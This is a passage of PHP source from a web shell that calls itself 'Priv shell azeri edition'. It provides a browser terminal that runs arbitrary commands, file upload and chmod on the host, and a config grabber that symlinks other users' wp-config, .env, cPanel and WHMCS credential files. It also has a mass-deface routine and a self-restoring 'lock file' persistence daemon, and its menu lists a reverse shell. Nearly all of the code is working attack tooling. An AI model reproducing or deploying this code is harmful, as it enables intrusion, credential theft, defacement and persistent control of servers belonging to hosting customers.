      <center><font color='#fff'>Filename : <font color='orange'>$files</font> (".$sbr($spr('%o',$flperm($_POST['path'])), -4).")<br><br>
      <form method='post'>
      <div class='input-group mb-3' style='width:230px;'>
    <input type='text' name='mod1' class='form-control' maxlength='4' height='10' value='".$_POST['mod1']."' placeholder='0644' required/> 
    <input type='hidden' name='path' value='".$_POST['path']."'>
    <input type='hidden' name='pilih' value='chmod'>
    <br><br><button type='submit' class='btn btn-outline-light mb-1' name='ganti' value='ganti'>Change</button></div>
    </form></td></table>";
    if (isset($_POST['ganti'])) {
      $opet = @chmod($_POST['path'], octdec($_POST['mod1']));
    if ($opet == true) {
        echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Changed Successfully!!</font></center></td></table>";
        } else {
            echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change!!</font></center></td></table>";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
    unzip($_POST['path'], $serlok);

} elseif ($_REQUEST[net('upload')] == "opet") {
    echo "<table class='directory-listing-table'><td><center>
    <form method='POST' enctype='multipart/form-data' id='upload'><h5><i class='fa fa-upload'></i> UPLOAD FILES<h5>
    <div class='input-group' style='width:360px;'>
    <input type='file' name='d7netfile' id='d7net' style='background-color: grey;' class='form-control' name='uplod'>
    <input type='submit' class='btn btn-outline-light' for='inputGroupFile02' name='uplod' value='Upload'></div>
              </form></center></td></table>";
     if (isset($_POST['uplod'])) {
        if ($_POST['dirnya'] == "2") {
            $serlok = $_SERVER['DOCUMENT_ROOT'];
        }
        if (empty($_FILES['d7netfile']['name'])) {
            echo "<br><table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> File not selected</center></font>";
        } else {
            $data = @file_put_contents($serlok."/".$_FILES['d7netfile']['name'], @file_get_contents($_FILES['d7netfile']['tmp_name']));
                if (file_exists($serlok."/".$_FILES['d7netfile']['name'])) {
                    $fl = $serlok."/".$_FILES['d7netfile']['name'];
                    echo "<br><table class='directory-listing-table' style='border-color:lime;'><td>
                    Uploaded => <font color='lime'><i>".$_FILES['d7netfile']['name']."</i></font><br>";
                    if (strpos($serlok, $_SERVER['DOCUMENT_ROOT']) !== false) {
                        $lwb = str_replace($_SERVER['DOCUMENT_ROOT'], $web."/", $fl);
                        echo "Link : <a href='".$lwb."' target='_blank'><font color='lime'>Click here</font></a></td></table><br>";
                    }
                    echo "<br>";
                } else {
                    echo "<br><table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center>There was an error uploading your file.</font></td></table>";
            }
        }
    }exit(); 

 } elseif ($_GET[net('tool')] == "opet") {
echo '<table class="directory-listing-table"><thead><td><center><font color=orange>Select Tools</font><hr>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("grab_config").'=opet">Grab Config</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("hashiden").'=opet">Hash Identifier</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("ner").'=opet">Adminer</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("massdef").'=opet">Mass Deface</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("searcher").'=opet">File Searcher</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("scanshell").'=opet">Shell Finder</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("lokfile").'=opet">Lock File</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("revgen").'=opet">Reverse Shell</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("resetcp").'=opet">Reset Cpanel</button><hr>&nbsp;';
        exit();

    } elseif ($_REQUEST[net('searcher')] == "opet") {
        echo '<table class="directory-listing-table"><td>
        <h5><i class="fa fa-search"></i> Advanced File Searcher</h5><hr>
        <form method="POST">
        <div class="input-group mb-3" style="width:750px;">
            <span class="input-group-text">Search Text:</span>
            <input type="text" name="search_text" class="form-control" placeholder="Enter text to search..." value="'.(isset($_POST['search_text']) ? htmlspecialchars($_POST['search_text']) : '').'">
        </div>
        <div class="input-group mb-3" style="width:750px;">
            <span class="input-group-text">Directory:</span>
            <input type="text" name="directory" class="form-control" placeholder="Enter directory path (default: current)" value="'.(isset($_POST['directory']) ? htmlspecialchars($_POST['directory']) : $serlok).'">
        </div>
        <div class="input-group mb-3" style="width:750px;">
            <span class="input-group-text">File Types:</span>
            <input type="text" name="extensions" class="form-control" placeholder="php,txt,html,js,css,log,ini,conf" value="'.(isset($_POST['extensions']) ? htmlspecialchars($_POST['extensions']) : 'php,txt,html,js,css,log,ini,conf').'">
        </div>
        <button type="submit" name="start_search" class="btn btn-outline-light" style="width:120px;">
            <i class="fa fa-search"></i> Search
        </button>&nbsp;
        <a href="?path='.$serlok.'&'.net('tool').'=opet" class="btn btn-outline-light" style="width:120px;">
            <i class="fa fa-arrow-left"></i> Back
        </a>
        </form>';
    
        if(isset($_POST['start_search']) && !empty($_POST['search_text'])) {
            $searchText = $_POST['search_text'];
            $directory = !empty($_POST['directory']) ? $_POST['directory'] : $serlok;
            $extensions = !empty($_POST['extensions']) ? explode(',', strtolower($_POST['extensions'])) : ['php','txt','html','js','css','log','ini','conf'];
    
            if (!is_dir($directory)) {
                echo '<div class="alert alert-danger mt-3">Invalid directory!</div>';
            } else {
                $startTime = microtime(true);
                $results = [];
                $scannedFiles = 0;
    
                try {
                    $it = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($directory)
                    );
    
                    foreach ($it as $file) {
                        if ($file->isFile() && in_array(strtolower($file->getExtension()), $extensions)) {
                            $scannedFiles++;
                            $filepath = $file->getPathname();
                            
                            $lines = file($filepath, FILE_IGNORE_NEW_LINES);
                            if ($lines === false) continue;
    
                            foreach ($lines as $lineNum => $line) {
                                if (stripos($line, $searchText) !== false) {
                                    $results[] = [
                                        'file' => $filepath,
                                        'line' => $lineNum + 1,
                                        'content' => trim($line)
                                    ];
                                }
                            }
                        }
                    }
                } catch (Exception $e) {
                    echo '<div class="alert alert-danger mt-3">Error: ' . htmlspecialchars($e->getMessage()) . '</div>';
                }
    
                $endTime = microtime(true);
                $duration = round($endTime - $startTime, 2);
    
                echo '<div class="mt-3 p-3" style="background: rgba(0, 216, 255, 0.1); border-radius: 4px;">
                    <i class="fa fa-info-circle"></i> Statistics:<br>
                    • Scanned Files: <font color="lime">' . $scannedFiles . '</font><br>
                    • Results Found: <font color="lime">' . count($results) . '</font><br>
                    • Duration: <font color="lime">' . $duration . '</font> seconds
                </div>';
    
                if (!empty($results)) {
                    foreach ($results as $result) {
                        echo '<div class="mt-3 p-3" style="background: rgba(30, 42, 53, 0.9); border-radius: 4px; border-left: 4px solid var(--primary-blue);">
                            <strong><i class="fa fa-file-code-o"></i> File:</strong> <font color="orange">' . htmlspecialchars($result['file']) . '</font><br>
                            <strong><i class="fa fa-terminal"></i> Line:</strong> <font color="lime">' . $result['line'] . '</font><br>
                            <div class="mt-2 p-2" style="background: rgba(0,0,0,0.3); border-radius: 4px; font-family: monospace;">
                                ' . htmlspecialchars($result['content']) . '
                            </div>
                        </div>';
                    }
                } else {
                    echo '<div class="mt-3 p-3" style="background: rgba(255, 0, 0, 0.1); border-radius: 4px;">
                        <i class="fa fa-exclamation-triangle"></i> No results found.
                    </div>';
                }
            }
        }
        echo '</td></table><br>';
        exit();

    } elseif ($_GET[net('cmd')] == "opet") {
        $server_name = $_SERVER['SERVER_NAME'];
        $username = function_exists("posix_getpwuid") ? posix_getpwuid(posix_geteuid())['name'] : getenv("USERNAME");
        if(isset($_POST['komen'])) {
            $command = strtolower(trim($_POST['komen']));
            if(strpos($command, 'cd ') === 0) {
                $newDir = substr($command, 3);
                if($newDir == '..') {
                    $serlok = dirname($serlok);
                } else if($newDir == '/') {
                    $serlok = '/';
                } else {
                    $targetDir = realpath($serlok . '/' . $newDir);
                    if($targetDir && is_dir($targetDir)) {
                        $serlok = $targetDir;
                    }
                }
                $_SESSION['current_dir'] = $serlok; 
            }
        }
    
        if(isset($_SESSION['current_dir'])) {
            $serlok = $_SESSION['current_dir'];
        }
        echo '<div class="terminal-wrapper">';
        echo "<table class='directory-listing-table terminal-container'><td>";
        echo '<div class="terminal-header">
                <div class="terminal-controls">
                    <span class="terminal-btn red"></span>
                    <span class="terminal-btn yellow"></span>
                    <span class="terminal-btn green"></span>
                </div>
                <div class="terminal-title">Terminal - ' . $server_name . '</div>
              </div>';
        echo '<div class="terminal-body">
                <div class="terminal-sidebar">
                    <div class="current-path">
                        <i class="fa fa-folder"></i> Current Path:
                        <div class="path-value">'.$serlok.'</div>
                    </div>
                </div>
                <div class="terminal-window">
                    <div class="command-input">
                        <form method="post" class="terminal-form">
                            <div class="terminal-input-line">
                                <span class="terminal-prompt">'.$username.'@'.$server_name.'</span>:<span class="terminal-path">~$</span>
                                <input type="text" name="komen" class="terminal-input" id="comandnya" 
                                       value="'.$_POST['komen'].'" placeholder="Enter command..." required autocomplete="off">
                            </div>
                            <button type="submit" name="comandeks" value="execute" class="terminal-submit">>></button>
                        </form>
                    </div>';
     
        if (isset($_POST['comandeks'])) {
            echo '<div class="command-output">
                    <div class="output-header">Command Output</div>
                    <div class="output-content">';
            ekse($_POST['komen'], $serlok);
            echo '</div></div>';
        }
        
        echo "</div></div></td></table>";
        echo "</div>";
     
        echo '<style>
        .terminal-wrapper {
            padding: 20px;
            font-family: "Share Tech Mono", monospace;
        }
        
        .terminal-container {
            background: rgba(0, 0, 0, 0.9) !important;
            border: 1px solid var(--matrix-green) !important;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
            padding: 0 !important;
            overflow: hidden;
            border-radius: 8px;
        }
        
        .terminal-header {
            background: rgba(0, 20, 0, 0.8);
            padding: 10px;
            border-bottom: 1px solid var(--matrix-green);
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
        }
        
        .terminal-title {
            color: var(--matrix-green);
            text-align: center;
            width: 100%;
            font-size: 14px;
        }
        
        .terminal-controls {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            display: flex;
            gap: 5px;
            z-index: 2;
        }
        
        .terminal-btn {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 1px rgba(0, 0, 0, 0.5);
        }
        
        .terminal-btn.red { background: #ff5f56; }
        .terminal-btn.yellow { background: #ffbd2e; }
        .terminal-btn.green { background: #27c93f; }
        
        .terminal-body {
            display: flex;
            min-height: 400px;
        }
        
        .terminal-sidebar {
            width: 200px;
            background: rgba(0, 15, 0, 0.95);
            padding: 15px;
            border-right: 1px solid var(--matrix-green);
        }
        
        .current-path {
            color: var(--matrix-green);
            font-size: 12px;
            word-break: break-all;
        }
        
        .path-value {
            margin-top: 5px;
            padding: 5px;
            background: rgba(0, 255, 65, 0.1);
            border-radius: 4px;
        }
        
        .terminal-window {
            flex: 1;
            background: rgba(0, 10, 0, 0.95);
            padding: 20px;
            display: flex;
            flex-direction: column;
        }
        
        .command-input {
            margin-bottom: 20px;
        }
        
        .terminal-input-line {
            display: flex;
            align-items: center;
            gap: 5px;
            background: rgba(0, 20, 0, 0.3);
            padding: 8px;
            border-radius: 4px;
            border: 1px solid rgba(0, 255, 65, 0.2);
        }
        
        .terminal-prompt {
            color: #4a9eff;
        }
        
        .terminal-path {
            color: #00ff41;
        }
        
        .terminal-input {
            background: transparent;
            border: none;
            color: var(--matrix-green);
            font-family: inherit;
            font-size: inherit;
            padding: 5px;
            margin-left: 5px;
            width: 100%;
        }
        
        .terminal-input:focus {
            outline: none;
            box-shadow: none;
        }
        
        .terminal-submit {
            background: transparent;
            border: none;
            color: var(--matrix-green);
            cursor: pointer;
            padding: 5px 10px;
        }
        
        .terminal-submit:hover {
            color: #fff;
            text-shadow: 0 0 5px var(--matrix-green);
        }
        
        .command-output {
            flex: 1;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 4px;
            border: 1px solid rgba(0, 255, 65, 0.2);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        
        .output-header {
            padding: 8px 15px;
            background: rgba(0, 20, 0, 0.5);
            border-bottom: 1px solid rgba(0, 255, 65, 0.2);
            color: var(--matrix-green);
            font-size: 12px;
        }
        
        .output-content {
            padding: 15px;
            overflow: auto;
            flex: 1;
        }
        
        .output-content textarea {
            background: transparent !important;
            border: none !important;
            color: var(--matrix-green) !important;
            font-family: inherit !important;
            width: 100% !important;
            height: auto !important;
            min-height: 300px;
            padding: 0 !important;
            resize: none;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0, 20, 0, 0.8);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--matrix-green);
            border-radius: 4px;
        }
        
        /* Scanline effect */
        .terminal-window::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                transparent 50%, 
                rgba(0, 255, 65, 0.02) 50%
            );
            background-size: 100% 4px;
            pointer-events: none;
            animation: scanline 8s linear infinite;
            opacity: 0.3;
        }
        </style>';
        exit();
    
} elseif ($_REQUEST[net('about')] == "opet") {
    echo "<table class='directory-listing-table'><thead><td><div style='font-family: Bungee Outline;font-size:24px;'>
    <img class='crot' src='https://m.media-amazon.com/images/M/MV5BMTk4NTk4MTk1OF5BMl5BanBnXkFtZTcwNTE2MDIwNA@@._V1_QL75_UX380_CR0,0,380,562_.jpg'/> Priv shell azeri edition</div><hr>
    <br> - cyber shell v0.1 <br> - Created by azeri tron</td></thead></table>"; exit();
} elseif ($_REQUEST[net('lokfile')] == "opet") {
    echo "<table class='directory-listing-table'><td>
    <h5><i class='fa fa-lock' style='color:#1A9DD2;'></i> Lock file<font class='d7net-text' style='font-size:12px;'><i> Linux</i></font></h5><hr style='color:#04FBFF;'>
    <center><form method='post'>
    <div class='input-group' style='width:300px;'>
    <span class='input-group-text mb-2'>Filename :</span>
    <input type='text' name='pile' class='form-control mb-2' placeholder='file.php'/></div><br>
    <button type='sumbit' class='btn btn-outline-light' style='width:120px;' name='submit'>Submit</button>&nbsp;
    <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='width:120px;'>Back</a></form><br></td></table>";
    if (isset($_POST['submit'])) {
        if (empty($_POST['pile'])) {
            echo "<br><table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center>The File field is required</center></font></td></table>";
        } else {
        $filez = $_POST['pile'];
        $tempe = "/tmp";
        if (file_exists($tempe.'/'.md5($serlok. $filez.'-xd7net').d7net_ex($filez).'xhand.Lock') && file_exists($tempe . '/'.d7net_ex($filez).'-xopet')) {
            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xopet').d7net_ex($filez).'xd7net.Lock', $serlok);
            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xd7net').d7net_ex($filez).'xhand.Lock', $serlok);
            }
            cmd("cp $filez ".$tempe."/".md5($serlok. $filez.'-xopet').d7net_ex($filez).'xd7net.Lock', $serlok);
            @chmod($filez, 0444);
            $content = '<?php
    $tmp = "/tmp";
    $fileperm = d7net_perm("'.$filez.'");
    d7net_cmd("chmod 444 '.$filez.'");
    while (True) {
        if (!file_exists("'.$filez.'")) {
            $var = base64_encode(file_get_contents($tmp . "/'.md5($serlok. $filez.'-xopet').d7net_ex($filez).'xd7net.Lock"));
            FiLe_pUt_ConTentS("'.$filez.'", base64_decode($var));
        }
        if ($fileperm != "0444"){
            d7net_cmd("chmod 444 '.$filez.'");
        }
    }
    function d7net_cmd($value)
    {
        if (function_exists("system")) {
            sYsTem($value);
        } else if (function_exists("shell_exec")) {
            return ShEll_eXeC($value);
        } else if (function_exists("exec")) {
            return ExEc($value);
        } else if (function_exists("passthru")) {
            return pAsSThRu($value);
        }
    }
    function d7net_perm($filez){
        return substr(sprintf("%o", fileperms($filez)), -4);
    }';
    $content = file_put_contents($tempe. "/" .md5($serlok. $filez.'-xd7net'). d7net_ex($filez).'xhand.Lock', $content);
    if ($content) {
        echo "<table class='directory-listing-table' style='border-color:lime;'><td>Locked => <font color='lime'>$filez</font></td></table>";
        cmd('php '. $tempe . '/' .md5($serlok. $filez.'-xd7net').d7net_ex($filez).'"xhand.Lock" > /dev/null 2>/dev/null &', $serlok);
    } else {
        echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Can't lock $filez</font></td></table>";
            }
        }
    }exit();
} elseif ($_GET[net('resetcp')] == "opet") {
echo "<table class='directory-listing-table'><td>
<h5>Coming Soon</h5><hr></td></table><br>";exit();
} elseif ($_GET[net('hashiden')] == "opet") {
 echo "<table class='directory-listing-table'><td>
<h5>Hash Identifier</h5>Identify and detect unknown hashes using this tool.<hr>
<form method='POST'>
<div class='input-group' style='width:650px;'>
<span class='input-group-text mb-2'>Your hash :</span>
<input type='text' name='hash' class='form-control mb-2' placeholder='write here'></div><br>
<button type='submit' name='submit' class='btn btn-outline-light'>Submit & identify</button>
&nbsp;<a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light'>Back</a></form></td></table><br>";
if (isset($_POST['submit'])) {
    if (empty($_POST['hash'])) {
        echo "<table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> The Hashes field is required</font></center></td></table>";
    } else {
function identify($hash) {
$algorithms = [
'<font color="lime">MD5' => '/^[a-f0-9]{32}$/i',
'<font color="lime">SHA1' => '/^[a-f0-9]{40}$/i',
'<font color="lime">SHA224, Keccak-224' => '/^[a-f0-9]{56}$/i',
'<font color="lime">SHA256' => '/^[a-f0-9]{64}$/i',
'<font color="lime">SHA512' => '/^[a-f0-9]{128}$/i',
'<font color="lime">Bcrypt, Blowfish(Unix)' => '/^\$2y\$[0-9]{2}\$[A-Za-z0-9\.\/]{53}$/',
'<font color="lime">Argon2i' => '/^\$argon2i\$v=\d+\$m=\d+,t=\d+,p=\d+\$[A-Za-z0-9\/+]{43,}\$[A-Za-z0-9\/+]{43,}$/',
'<font color="lime">Argon2id' => '/^\$argon2id\$v=\d+\$m=\d+,t=\d+,p=\d+\$[A-Za-z0-9\/+]{43,}\$[A-Za-z0-9\/+]{43,}$/'];
    foreach ($algorithms as $name => $pattern) {
        if (preg_match($pattern, $hash)) {
            return $name;
        }
    }
    return '<font color="red">Could not identify / Tidak dapat mengidentifikasi</font>';
}
$hashes = [$_POST['hash']];
echo "<table class='directory-listing-table'><td>";
foreach ($hashes as $hash) {
    echo "
    Hash : <font color='lime'>$hash\n</font>";
    echo "<br> Algorithms : " .identify($hash). "\n\n</font></td></table>";
            }
        }
    } exit();
} elseif ($_GET[net('grab_config')] == "opet") {
@ini_set('max_execution_time',0); 
@ini_set('display_errors', 0); 
@ini_set('file_uploads',1);
echo '<table class="directory-listing-table"><thead><td>
<center>Config Grabber<br><br><form method="POST"><textarea cols="100" name="passwd"  rows="25">'; 
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) { 
$str=explode(":",$usrr); echo $str[0]."\n"; } 
echo'</textarea><br>
<input type="hidden" class="input" name="folfig" value="d7netcfg"/><br>
<select class="form-select form-select-sm" aria-label=".form-select-lg example" style="width:150px;">
<option>select menu</option>
<option title="type txt" value=".txt">.txt</option>
<option title="type php" value=".php">.php</option>
<option title="type shtml" value=".shtml">.shtml</option>
<option title="type ini" value=".ini">.ini</option>
<option title="type html" value=".html">.html</option></select><br>
<input name="conf" style="width:100px;" class="btn btn-outline-light" value="submit" type="submit">
</td></thead></table></form></center><br>';
} if(isset($_POST['conf'])) {
$v = "var";
$folfig = $_POST['folfig']; $type = $_POST['type'];
@mkdir($folfig, 0755); 
@chdir($folfig);
$htaccess="
Options Indexes FollowSymLinks
\nDirectoryIndex .my.cnf
\nAddType txt .php
\nAddType txt .my.cnf
\nAddType txt .accesshash
\nAddHandler txt .php
\nAddHandler txt .cnf
\nAddHandler txt .accesshash
";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=explode("\n",$_POST["passwd"]);
foreach($passwd as $pwd){ $user=trim($pwd);
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vBulletin1.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-vBulletin3.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-vBulletin4.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-Phpbb1.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wp1.txt');
@symlink('/home/'.$user.'/htdocs/wp-config.php',$user.'-Wp-htdocs.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wp2.txt');
@symlink('/home/'.$user.'/public_html/web/wp-config.php',$user.'-Wp3.txt');
@symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-WpHm1.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-WpHm2.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-WpHm3.txt');
@symlink('/var/www/html/wp-config.php',$v.'-wp1.txt');
@symlink('/home/'.$user.'/public_html/.env',$user.'-Laravel1.txt');
@symlink('/home/'.$user.'/public_html/web/.env',$user.'-Laravel2.txt');
@symlink('/home/'.$user.'/public_html/public/.env',$user.'-Laravel3.txt');
@symlink('/var/www/html/.env',$v.'-LaravelV.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla1.txt');
@symlink('/home/'.$user.'/public_html/html/configuration.php',$user.'-Joomla2.txt');
@symlink('/home/'.$user.'/public_html/web/configuration.php',$user.'-Joomla3.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-Whm1.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-Whm2.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-Whm3.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-Whm4.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-Whm5.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-Whm6.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-Whm7.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-Whm8.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-Whm9.txt');
@symlink('/home/'.$user.'/public_html/app/etc/local.xml',$user.'-Magento.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter.txt');
@symlink('/home/'.$user.'/public_html/web/application/config/database.php',$user.'-CodeIgniterH.txt');
@symlink('/home1/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter1.txt');
@symlink('/home2/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter2.txt');
@symlink('/home3/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter3.txt');
@symlink('/home/'.$user.'/.my.cnf',$user.'-cpanel.txt');
@symlink('/home/'.$user.'/.accesshash',$user.'-whm.txt');
@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-opencart.txt');
@symlink('/home/'.$user.'/public_html/app/etc/local.xml',$user.'-mangento.txt');
echo '<table class="directory-listing-table"><thead><td><center>Done => <a href='.$folfig.' target="_blank" class="button">Click Here</a></center></td></thead></table><br>';
    }exit();
} elseif ($_REQUEST[net('scanshell')] == "opet") {
    echo "<center><table class='directory-listing-table'><td>
    <form method='post'>
    <h5><i class='fa-solid fa-newspaper'></i> Backdoors Scanning</font></h5><hr>
    *note : Jika resultnya kosong berarti tidak ditemukan/ekstensi nya di isi dengan benar
    <div class='input-group mb-2' style='width:350px;'>
    <span class='input-group-text mb-1'>Extension :</span>
    <input type='text' class='form-control' name='ext' placeholder='ex : php, phar, shtml, phtml'></div>
    <div class='input-group mb-2' style='width:550px;'>
    <span class='input-group-text mb-1'>Directory :</span>
    <input type='text' class='form-control' name='peth' value='$serlok'></div>
    <button type='submit' class='btn btn-outline-light' name='submit' style='width:120px;'>Submit</button>&nbsp;
    <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='width:120px;'>Back</a>
    </form></td></table><br>";
    if(isset($_POST['submit'])) {
        function scan_directory($dir) {
    $ext = $_POST['ext'];
    $rdi = new RecursiveDirectoryIterator($dir);
    echo "<table class='directory-listing-table'><td>";
    foreach (new RecursiveIteratorIterator($rdi) as $filename => $file) {
        if (pathinfo($filename, PATHINFO_EXTENSION) == $ext) {
            $content = file_get_contents($filename);
            if (preg_match('/(eval|base64_decode|str_rot13|mass_deface|addrdp|@exec|@passthru|@chmod|#exec|deface|command|{IFS}|shell_exec|SERVER_SOFTWARE|wget|@get_current_user|@getmygid|htmlspecialchars_decode|B374k|@getmygid|hacked|exe_root|xploit|Disable_Function|backdoor|backconnect|gecko-select|php_uname|Alfa-Team|ALFA_DATA|MARIJUANA|blackeagleteam|IndoSec|getHostByName|alfashell|php-obfuscator|gacor|slot-gacor|slot88|featureShell|move_upload_file|upload)\s*\(/i', $content)) {
                echo "<pre>Found : <font color='lime'>$filename</font> => <font color='orange'>Detected</font> <a href='?viewfile=$filename&path=".$_GET['path']."/$rdi' target='_blank'><i>view</i></a></pre>\n";
            }
        }
    } 
} 
$cek = $_POST['peth'];
if ($cek) {
scan_directory($cek);
echo "<font color='aqua'>Scan Completed..!!</font></td></table><br>";
        } 
    } exit();
} elseif ($_REQUEST[net('massdef')] == "opet") {
    function sabun_massal($serlok,$namafile,$isi_script) {
        if(is_writable($serlok)) {
            $dira = scandir($serlok);
            foreach($dira as $dirb) {
                $dirc = "$serlok/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=lime>DONE</font>] $serlok<br>";
                            file_put_contents($lokasi, $isi_script);
                            $idx = sabun_massal($dirc,$namafile,$isi_script);
                        }
                    }
                }
            }
        }
    }
    function sabun_biasa($serlok,$namafile,$isi_script) {
        if(is_writable($serlok)) {
            $dira = scandir($serlok);
            foreach($dira as $dirb) {
                $dirc = "$serlok/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo " http://$dirb/$namafile<br>";
                            file_put_contents($lokasi, $isi_script);
                        }
                    }
                }
            }
        }
    }
    if($_POST['start']) {
        if($_POST['tipe_sabun'] == 'mahal') {
            echo "<table class='directory-listing-table'><td>";
            sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</td></table></div>";
        } elseif($_POST['tipe_sabun'] == 'murah') {
            echo "<table class='directory-listing-table'><td>";
            sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</td></table></div>";
        }
    } else {
    echo "<table class='directory-listing-table'><td>";
    echo "<form method='post'>
    <div class='form-check-inline mb-2'>
    <input type='radio' name='tipe_sabun' id='biasa' class='form-check-input' value='murah' checked>
    <label class='form-check-label' for='inlineRadio1'>Biasa</label></div>
    <div class='form-check form-check-inline'>
    <input type='radio' name='tipe_sabun' class='form-check-input' value='mahal'>
    <label class='form-check-label' for='inlineRadio2'>Massal</label></div>
    <div class='input-group' style='width:430px;'>
    <span class='input-group-text mb-1'>Files :</span>
    <input type='text' name='d_file' class='form-control' placeholder='file.html'></div>
    <div class='input-group' style='width:750px;'>
    <span class='input-group-text mb-1'>Path :</span>
    <input type='text' name='d_dir' class='form-control' value='$serlok'></div>
    <textarea name='script' class='form-control' style='width: 750px; height: 300px;' placeholder='Hello Word!'></textarea><br>
    <button type='submit' name='start' value='start' class='btn btn-outline-light' style='width: 300px;'>submit</button>&nbsp;
    <a href='?path=$serlok&".net('tool')."=opet' class='btn btn-outline-light' style='width: 300px;'>Back</a>
    </form></td></table>";
    }exit();
} elseif ($_REQUEST[net('ner')] == "opet") {
    function crot($url){
        $d7net = curl_init($url);
        curl_setopt($d7net, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($d7net, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($d7net, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($d7net, CURLOPT_HEADER, 0);
        return curl_exec($d7net);
        curl_close($d7net);
    } 
        echo "<table class='directory-listing-table'><td><h5><i class='fa fa-database' aria-hidden='true'></i> Adminer<font class='d7net-text' style='font-size:12px;'><i> v4.8.1</i></font></h5><hr><center>
    <form method='POST'>
    <div class='input-group' style='width:300px;'>
    <span class='input-group-text mb-2'>Filename :</span>
    <input type='text' placeholder='adminer.php' class='form-control mb-2' name='miner'></div><br>
        <button type='sumbit' class='btn btn-outline-light' name='gass' style='width:120px;'>Submit</button>&nbsp;
        <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='width:120px;'>Back</a></form></td></table><br>";
    if(isset($_POST['gass'])) {
        if (empty($_POST['miner'])) {
            echo "<table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Input field is required<center></font></td></table>";
        } else {
